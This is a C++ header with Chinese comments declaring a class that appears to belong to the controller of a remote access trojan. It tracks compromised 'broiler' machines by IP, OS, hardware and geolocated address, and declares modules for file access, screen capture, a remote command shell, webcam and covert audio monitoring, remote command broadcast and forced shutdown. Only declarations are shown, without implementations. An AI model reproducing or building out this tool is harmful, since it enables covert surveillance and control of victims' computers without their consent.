#pragma once

#include "ModuleSocket.h"
#include "Common.h"
#include "FileManager.h"
#include "QQwry.h"
#include "CmdShell.h"
#include "SystemManager.h"
#include "ChatDlg.h"
#include "ScreenDlg.h"
#include "VideoDlg.h"
#include "AudioDlg.h"
#include "RemoteCmdDlg.h"
#include "DesktopDlg.h"

//肉鸡的 数据信息
class CBroilerData : public CDialog
{
public:
	CBroilerData(UINT id, SOCKET socket, sockaddr_in* serAddr, HWND hWnd);
	~CBroilerData(void);

public:
	void OpenWorkThread();   //开启工作线程
	UINT32 ShackHandCheck(IN const char* pSingle, OUT bool* pbSuccess); //握手验证
    void OnBeginListen();
	static DWORD WINAPI OnListenProc(LPVOID lpParameter);
	CString OSVersion(IN int sysVer);
	void RunToFileManager();  //运行文件管理
	void RunToScreenManager();  //运行屏幕管理
	void RunToSystemManager();  //运行系统管理
	void RunToCMDShellManager();  //运行CMDShell
	void RuntToVideoManager();   //运行摄像头
   
	SOCKET  m_socket;         //通信socket信息(消息的传递)
	CFileManager* m_pFileDlg;       //文件操作对话框类
	CScreenDlg* m_pScreenDlg;       //屏幕管理对话框类
	CSystemManager* m_pSystemDlg;   //系统管理对话框类
    CCmdShell* m_pCmdShellDlg;      //CMDShell操作对话框类
	CVideoDlg* m_pVideoDlg;         //摄像头
   
	CString CharToCString(char* result);
	CStringW CStrA2CStrW(const CStringA &cstrSrcA);  // CStringA转CStringW  Unicode环境下
	CStringA CStrW2CStrA(const CStringW &cstrSrcW);  // CStringW转CStringA

public:
	//菜单目录
	void RunToChatMsgManager();  //信使服务
    CChatDlg* m_pChatDlg;   //聊天对话框类
	void RunToOperatorManager(IN const int nType);   //关机/注销/重启

	CAudioDlg* m_pAudioDlg;  //语音监听类
	void RunToAudioManager();  //运行语音监听

	CRemoteCmdDlg* m_pRemoteCmdDlg;  //远程命令广播
	void RunToRemoteCmdManager(); //远程命令

	CDesktopDlg* m_pDesktopDlg;  //桌面管理
	void RunToDesktopManager();   //桌面管理

//data operation
public:
	UINT getID() const {return m_nId; }
	void SetID(const UINT nId) {m_nId = nId; }

	CString getWANIP() const {return m_strWANIP; }
	void SetWANIP(const CString strWANIP) {m_strWANIP = strWANIP; }

	CString getLocalIP() const {return m_strLocalIP; }
	void SetLocalIP(const CString strLocalIP) {m_strLocalIP = strLocalIP; }
	
	CString getRemark() const {return m_strRemark; }
	void SetRemark(const CString strRemark) {m_strRemark = strRemark; }

	CString getOSVersion() const {return m_strOSVersion; }
	void SetOSVersion(const CString strOSVersion) {m_strOSVersion = strOSVersion; }

	CString getCPU() const {return m_strCPU; }
	void SetCPU(const CString strCPU) {m_strCPU = strCPU; }

	bool bCap() const {return m_bCam; }
	void SetCam(const bool bCam) {m_bCam = bCam; }

	CString getDiskSize() const {return m_strDiskSize;}
	void SetDiskSize(const CString strDiskSize) {m_strDiskSize = strDiskSize; }

	CString getAddress() const {return m_strAddress; }
	void SetAddress(const CString strAddress) {m_strAddress = strAddress; }
private:
	HWND    m_hWnd;
	CModuleSocket m_ModuleSocket;
	CQQwry m_QQwry;   //查询IP地址物理位置

	UINT    m_nId;            //ID编号
	CString m_strWANIP;       //公网ip地址
	CString m_strLocalIP;     //本地ip地址
	CString m_strRemark;      //计算机名/备注
	CString m_strOSVersion;   //操作系统的版本
	CString m_strCPU;         //CPU信息
	bool    m_bCam;           //摄像头
	CString m_strDiskSize;    //硬盘大小
	CString m_strAddress;     //物理地址
};
